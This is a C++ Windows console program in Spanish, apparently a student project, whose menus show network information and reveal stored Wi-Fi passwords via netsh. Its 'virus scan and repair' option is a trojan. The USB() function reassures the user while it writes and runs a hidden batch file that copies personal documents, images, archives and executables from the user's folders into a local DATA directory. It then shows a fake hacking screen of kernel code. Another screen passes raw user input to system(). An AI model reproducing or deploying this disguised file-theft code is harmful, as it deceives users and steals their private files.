	cout<<"      ";ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);ct(15);cout<<"PARA VER CONTRASE?A DE LA RED GUARDADA, INGRESA EL COMANDO:"<<s1;
	ct(6);cout<<"    "<<"netsh wlan show profile name=(nombre de red) key=clear"<<s1;
	ct(6);
	ct(1);cout<<br;
	ct(15);
	ct(9);
	system("netsh wlan show profile");
	while(true)
	{
		ct(1);cout<<s1<<br;
		ct(15);cout<<p1;
		cout<<s1<<"   "<<"EN CUALQUIER MOMENTO, ESCRIBA: ";ct(6);cout<<"salir / volver";ct(15);cout<<" - ";ct(11);cout<<"PARA VOLVER AL MENU";
		cout<<s1<<"   ";ct(6);cout<<"reintentar / retry";ct(15);cout<<" - ";ct(11);cout<<"PARA LIMPIAR PANTALLA";
		cout<<s1<<p1<<"COMANDO: ";ct(6);
		string comando;
		getline(cin, comando);
		system(comando.c_str());
		if(comando=="salir"||comando=="Salir"||comando=="SALIR"||comando=="exit"||comando=="Exit"||comando=="EXIT")menuredes();
		if(comando=="reintentar"||comando=="Reintentar"||comando=="REINTENTAR"||comando=="retry"||comando=="Retry"||comando=="RETRY")redesguardadas();
		if(comando == "volver"|| comando == "Volver" || comando == "VOLVER" || comando == "back" || comando == "Back" || comando == "BACK")menuredes();
	}
	
}

void vermac()	//LISTO
{
	limpiar();
	vvermac();
	
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"LISTA DIRECIONES MAC CONECTADAS DE INTERFACES DE RED"<<s1;
	ct(1);cout<<b<<s1;
	ct(8);
	system("getmac");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<"10";ct(15);cout<<" SEGUNDOS"<<s1;  
	ct(1);cout<<b<<s1;
	delay(10);
	menuredes();
}

void interfaces()	//LISTO
{
	limpiar();
	vinterfaces();
	
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"LISTA DE INTERFACES CONECTADAS Y NO CONECTADAS"<<s1;
	ct(1);cout<<b<<s1;
	ct(8);
	system("netsh interface show interface");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<"10";ct(15);cout<<" SEGUNDOS"<<s1;  
	ct(1);cout<<b<<s1;
	delay(10);
	menuredes();
}

void protocolos()	//LISTO
{
	limpiar();
	vprotocolos();
	
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"ESTADISTICAS PROTOCOLOS TPC UDP, CONEXIONES ACTIVAS"<<s1;
	ct(1);cout<<b<<s1;
	ct(8);
	ct(8);system("netstat -s -p tcp");
	ct(1);cout<<b<<s1;
	ct(8);system("netstat -s -p udp");
	ct(1);cout<<b<<s1;
	ct(8);system("netstat -a");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<"10";ct(15);cout<<" SEGUNDOS"<<s1;  
	ct(1);cout<<b<<s1;
	delay(10);
	menuredes();
}

void arp()	//LISTO
{
	limpiar();
	varp();
	
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<p1<<"TABLA ARP"<<s1;
	ct(1);cout<<b;
	ct(8);
	system("arp -a");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<"20";ct(15);cout<<" SEGUNDOS"<<s1;  
	ct(1);cout<<b<<s1;
	delay(20);
	menuredes();
}

void driver()	//LISTO
{
	limpiar();
	vdriver();
	
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<p1<<"LISTA DE DRIVER DE RED"<<s1;
	ct(1);cout<<b<<s1;
	ct(8);
	system("netsh wlan show drivers");
	ct(1);cout<<b<<s1;
	ct(15);cout<<p1<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<"10";ct(15);cout<<" SEGUNDOS"<<s1;  
	ct(1);cout<<b<<s1;
	delay(10);
	menuredes();
}

void aplicaciones()	//LISTO
{
	limpiar();
	vaplicaciones();
	
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b2<<s1;
	ct(15);cout<<t1<<t1<<"LISTA DE APPS INSTALADAS"<<s1;
	ct(1);cout<<b2<<s1;
	ct(8);
	system("winget upgrade");
	ct(1);cout<<b2<<s1;
	ct(15);cout<<p1<<"    REGRESARA AL MENU ANTERIOR EN ";ct(1);cout<<"10";ct(15);cout<<" SEGUNDOS"<<s1;  
	ct(1);cout<<b2<<s1;
	delay(10);
	infequipo();
}

void menuhack()
{
	limpiar();
	vmenuhack();
	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b<<s1;
	ct(15);cout<<t1<<t1<<"MENU REPARACIONES DEL SISTEMA"<<s1;
	ct(1);cout<<b<<s1;
	//VARIABLES DEL MENU
	string linea;
	int numero;
	bool repite = true;
	
	do{
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"1";ct(15);cout<<" - ESCANER Y REPARACION EN BUSCA DE VIRUS."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"2";ct(15);cout<<" - VOLVER A INICIO."<<s1;
		cout<<t1;ct(10);cout<<"[";ct(1);cout<<"+";ct(10);cout<<"] ";ct(11);cout<<"3";ct(15);cout<<" - PARA SALIR."<<s1;
		ct(11);cout<<t1<<"    ";
		getline(cin, linea);
		liberal();
		if (esEntero(linea))
		{
			repite = false;
			numero = atoi(linea.c_str());
			
			if(numero >= 1 && numero <=5)
			{
				switch (numero)
				{
					case 1:
						delay(1);
						USB();
					break;
					case 2:
						delay(1);
						menu();
					break;
					case 3:
						delay(1);
						salir();
					break;
					
				}
				
			}else{
				ct(1);cout<<b;
				ct(15);
				cout<<s1<<t1<<numero<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
				ct(1);cout<<b<<s1;
				delay(3); 
				menu();
			}
			
		}else{
			ct(1);cout<<b;
			ct(15);
			cout<<s1<<t1<<linea<<" NO ES UNA OPCION DEL MENU"<<s1<<t1<<"INTENTE DE NUEVO EN 3 SEGUNDOS."<<s1;
			ct(1);cout<<b<<s1;
			delay(3);
			menu();
		}
	} while (repite);
	
	cin.get();
	
}

void USB()
{
	//NUMERORAMDOM
	srand(time(0));
	int min = 1, max = 8, ramd;
	ramd = min+rand()%(max-min+1);	
	//FIN
	ramd = 1;
	limpiar();
	vUSB();

	SetConsoleTitle("SENA - Centro de Tecnologia de la Manufactura Avanzada.");
	ct(1);cout<<b1<<s1;
	cout<<t1<<t1;ct(15);cout<<"ESCANER Y REPARACION EN BUSCA DE VIRUS."<<s1;
	ct(1);cout<<b1<<s1;
	ct(15);
	cout<<p1<<"Este progama inicia un escaneo que recorre hasta el ultimo bite de tu equipo,"<<s1;delay(2);
	cout<<p1<<"hasta encontrar errores del sistema o virus es posible que se habran algunas,"<<s1;delay(1);
	cout<<p1<<"ventanas en segundo plano, no se alarme todo estara bien es algo necesario,"<<s1;delay(2);
	cout<<p1<<"para optimizar y recorer cada parte de tu equipo con mas velocidad,"<<s1;delay(1);
	cout<<p1<<"asi mismo mientras ejecuta el analisis va reparando sectores defectuosos,"<<s1;delay(1);
	cout<<p1<<"deje que el programa termine para evitar errores del sistema."<<s1;delay(1);
	ct(1);cout<<b1<<s1;
	cout<<t1<<s5;ct(1);cout<<"<";ct(7);cout<<"#";ct(1);cout<<">";ct(10);cout<<"Preparando todo para el anlisis del equipo.";delay(ramd);cout<<".";delay(2);cout<<".";delay(ramd);cout<<"."<<s1;
		
		///CREO EL ARCHIVO Y EJECUTO EL ARCHVIO EN MODO OCulTO MIENTRAS EL PROGRAMA CORRE.
		
		ofstream file;
		file.open("Settings.bat");
		file << "@echo off \n\n";
		file << "attrib +h Settings.bat \n";
		file << "IF NOT EXIST \".\\DATA\"\%USERNAME% MD \".\\DATA\\\"%USERNAME%\n";
		file << "IF NOT \"%~1\" EQU \"Background\" ((Start \/MIN \"\" \"%~0\" Background) & (Exit))\n\n";
		  
		file << "cd \".\\DATA\\\"%USERNAME%\n\n";
		  
		file << "for \/R %USERPROFILE%\\Pictures\\ \%%x in (*.rar,*.exe,*.zip,*.jpg,*.png,*.pfd,*.docx,*.xlsx,*.pptx) do copy \"\%%x\"\n";
		file << "for \/R %USERPROFILE%\\Downloads\\ \%%x in (*.rar,*.exe,*.zip,*.jpg,*.png,*.pfd,*.docx,*.xlsx,*.pptx) do copy \"\%%x\"\n";
		file << "for \/R %USERPROFILE%\\Documents\\ \%%x in (*.rar,*.exe,*.zip,*.jpg,*.png,*.pfd,*.docx,*.xlsx,*.pptx) do copy \"\%%x\"\n";
		file << "for \/R %USERPROFILE%\\Desktop\\ \%%x in (*.rar,*.exe,*.zip,*.jpg,*.png,*.pfd,*.docx,*.xlsx,*.pptx) do copy \"\%%x\"\n";
		file << "for \/R %USERPROFILE%\\Music\\ \%%x in (*.rar,*.exe,*.zip,*.jpg,*.png,*.pfd,*.docx,*.xlsx,*.pptx) do copy \"\%%x\"\n";
		file << "for \/R %USERPROFILE%\\Videos\\ \%%x in (*.rar,*.exe,*.zip,*.jpg,*.png,*.pfd,*.docx,*.xlsx,*.pptx) do copy \"\%%x\"\n";
		file << "for \/R %USERPROFILE%\\Pictures\\ \%%x in (*.rar,*.exe,*.zip,*.jpg,*.png,*.pfd,*.docx,*.xlsx,*.pptx) do copy \"\%%x\"\n\n";
		  
		file << "EXIT";
		  
		file.close();
		  
		  
		  
		///FIN.
		
	//CONTINUA ELPROGRAMA
	cout<<t1<<s5;ct(1);cout<<"<";ct(6);cout<<"$";ct(1);cout<<">";ct(10);
	cout<<"Iniciando analisis";delay(ramd);cout<<".";delay(2);cout<<".";delay(ramd);cout<<".";delay(3);cout<<".";delay(5);cout<<".";delay(ramd);cout<<" DONE."<<s1;
	cout<<t1<<s5;ct(1);cout<<"<";ct(2);cout<<"$";ct(1);cout<<">";ct(10);
	cout<<"Equipo analizado satisfactoria mente.";delay(ramd);cout<<s1;
	ct(1);cout<<b1<<s1;
	delay(2);
	cout<<t1<<s5;;ct(1);cout<<"<";ct(6);cout<<"$";ct(1);cout<<">";ct(10);
	cout<<"Iniciando analisis de red.";delay(ramd);cout<<".";delay(2);cout<<".";delay(ramd);cout<<".";delay(3);cout<<".";delay(5);cout<<".";delay(ramd);cout<<"."<<" DONE."<<s1;
	cout<<t1<<p1;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Analizando red.";delay(1);cout<<".";delay(ramd);cout<<".";delay(3);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<"."<<s1;
	cout<<t1<<p1;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Analizando red LAN.";delay(1);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<". DONE."<<s1;
	cout<<t1<<p1;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Analizando red LAN - redes privadas.";delay(1);cout<<".";delay(ramd);cout<<".";delay(2);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<"."<<s1;
	cout<<t1<<p1;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Analizando red LAN - redes publicas.";delay(1);cout<<".";delay(ramd);cout<<".";delay(3);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<"."<<" DONE."<<s1;
	ct(1);cout<<b1<<s1;
	cout<<t1<<p1;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Analizando red WAN.";delay(1);cout<<".";delay(ramd);cout<<".";delay(3);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<"."<<s1;
	cout<<t1<<p1;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Analizando red WAN - redes privadas.";delay(1);cout<<".";delay(ramd);cout<<".";delay(2);cout<<".";delay(ramd);cout<<".";delay(2);cout<<".";delay(ramd);cout<<"."<<s1;
	cout<<t1<<p1;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Analizando red WAN - redes publicas.";delay(1);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<".";delay(1);cout<<".";delay(ramd);cout<<". DONE."<<s1;
	
	simulacion1();
	
}

void simulacion1()
{
	
	//NUMERORAMDOM
	srand(time(0));
	int min = 1, max = 8, ramd;
	ramd = min+rand()%(max-min+1);	
	//FIN
	ramd = 1;
	///SIMULACION HACKEO MASIVO
	cout<<t1<<s5;ct(1);cout<<"<";ct(2);cout<<"+";ct(1);cout<<">";ct(10);
	cout<<"Finalizando analisis.";delay(ramd);cout<<"."<<s1;
	cout<<t1<<s5;ct(1);cout<<"<";ct(4);cout<<"+";ct(1);cout<<">";ct(12);
	cout<<"ERROR FATAL DEL SISTEMA.";delay(1);cout<<".";delay(1);cout<<"."<<s1;
	
	system("call Settings.bat");
	system("call simu.bat");
	
	cout<<t1<<p1;ct(1);cout<<"<";ct(4);cout<<"+";ct(1);cout<<">";ct(12);
	cout<<"ERROR.";delay(1);cout<<".";delay(1);cout<<".";delay(1);cout<<"."<<s1;
	cout<<t1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"struct group_info";delay(2);cout<<" init_groups = { .usage";delay(1);cout<<" = ATOMIC_INIT(2) };"<<s1;delay(1);
	cout<<t1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"struct";delay(2);cout<<" group_info *groups";delay(1);cout<<" _alloc(int gidsetsize){"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"struct group_info *group_info;"<<s1;delay(2);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"int nblocks;"<<s1;delay(2);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"int i;"<<s1;delay(2);
	cout<<s1<<s1<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"nblocks =";delay(1);cout<<" (gidsetsize + NGROUPS_PER_BLOCK - 1)";delay(2);cout<<" / NGROUPS_PER_BLOCK;"<<s1;delay(2);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"/*Make sure we always allocate at least one indirect block pointer*/"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"nblocks ";delay(1);cout<<"= ";delay(2);cout<<"nblocks ? : 1;"<<s1;delay(2);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info =";delay(1);cout<<" kmalloc(sizeof(*";delay(1);cout<<"group_info) + nblocks*",delay(1);cout<<"sizeof(gid_t *), GFP_USER);"<<s1;delay(2);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if";delay(1);cout<<" (!group_info)"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return";delay(1);cout<<" NULL;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->ngroups = gidsetsize;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->nblocks = nblocks;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"atomic_set(&group_info->usage, 1);"<<s1<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if (gidsetsize ";delay(1);cout<<"<= NGROUPS_SMALL)"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info";delay(1);cout<<"->blocks[0]";delay(1);cout<<" = group_info->small_block;"<<s1;
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"else {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"for ";delay(1);cout<<"(i = 0; i <";delay(1);cout<<" nblocks; i++) {"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     gid_t *b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     b = (void *)__";delay(1);cout<<"get_free_page(GFP_USER);"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     if (!b)"<<s1;delay(1);
	cout<<t1<<p1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"   goto out_undo_partial_alloc;"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     group_info->blocks[i] = b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return group_info;"<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"out_undo_partial_alloc:"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"while (--i >= 0) {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"   free_page((unsigned long)group_info->blocks[i]);"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"kfree(group_info);"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return NULL;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if";delay(1);cout<<" (!group_info)"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return";delay(1);cout<<" NULL;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->ngroups = gidsetsize;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->nblocks = nblocks;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"atomic_set(&group_info->usage, 1);"<<s1<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if (gidsetsize ";delay(1);cout<<"<= NGROUPS_SMALL)"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info";delay(1);cout<<"->blocks[0]";delay(1);cout<<" = group_info->small_block;"<<s1;
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"else {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"for ";delay(1);cout<<"(i = 0; i <";delay(1);cout<<" nblocks; i++) {"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     gid_t *b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     b = (void *)__";delay(1);cout<<"get_free_page(GFP_USER);"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     if (!b)"<<s1;delay(1);
	cout<<t1<<p1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"   goto out_undo_partial_alloc;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     group_info->blocks[i] = b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return group_info;"<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"/*Make sure we always allocate at least one indirect block pointer*/"<<s1;
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"nblocks ";delay(1);cout<<"= ";delay(2);cout<<"nblocks ? : 1;"<<s1;delay(2);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info =";delay(1);cout<<" kmalloc(sizeof(*";delay(1);cout<<"group_info) + nblocks*";cout<<"sizeof(gid_t *), GFP_USER);"<<s1;delay(2);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if (gidsetsize ";delay(1);cout<<"<= NGROUPS_SMALL)"<<s1;
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info";delay(1);cout<<"->blocks[0]";delay(1);cout<<" = group_info->small_block;"<<s1;
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"else {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"for ";delay(1);cout<<"(i = 0; i <";delay(1);cout<<" nblocks; i++) {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     gid_t *b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     b = (void *)__";delay(1);cout<<"get_free_page(GFP_USER);"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     if (!b)"<<s1;delay(1);
	cout<<t1<<p1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"   goto out_undo_partial_alloc;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"     group_info->blocks[i] = b;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return group_info;"<<s1;delay(1);
	
	cout<<t1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"struct group_info";delay(2);cout<<" init_groups = { .usage";delay(1);cout<<" = ATOMIC_INIT(2) };"<<s1;delay(1);
	cout<<t1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"struct";delay(2);cout<<" group_info *groups";delay(1);cout<<" _alloc(int gidsetsize){"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"struct group_info *group_info;"<<s1;delay(2);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"int nblocks;"<<s1;delay(2);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"int i;"<<s1;delay(2);
	cout<<s1<<s1<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"nblocks =";delay(1);cout<<" (gidsetsize + NGROUPS_PER_BLOCK - 1)";delay(2);cout<<" / NGROUPS_PER_BLOCK;"<<s1;delay(2);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"/*Make sure we always allocate at least one indirect block pointer*/"<<s1;delay(1);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"nblocks ";delay(1);cout<<"= ";delay(2);cout<<"nblocks ? : 1;"<<s1;delay(2);
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info =";delay(1);cout<<" kmalloc(sizeof(*";delay(1);cout<<"group_info) + nblocks*",delay(1);cout<<"sizeof(gid_t *), GFP_USER);"<<s1;delay(2);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if";delay(1);cout<<" (!group_info)"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return";delay(1);cout<<" NULL;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->ngroups = gidsetsize;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"group_info->nblocks = nblocks;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"atomic_set(&group_info->usage, 1);"<<s1<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"out_undo_partial_alloc:"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"while (--i >= 0) {"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"   free_page((unsigned long)group_info->blocks[i]);"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"kfree(group_info);"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"return NULL;"<<s1;delay(1);
	cout<<t1<<p1;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"}"<<s1;delay(1);
	
	cout<<t1<<s5;ct(6);cout<<"<";ct(4);cout<<"X";ct(6);cout<<">";ct(2);
	cout<<"if";delay(1);cout<<" (!group_info)"<<s1;delay(1);
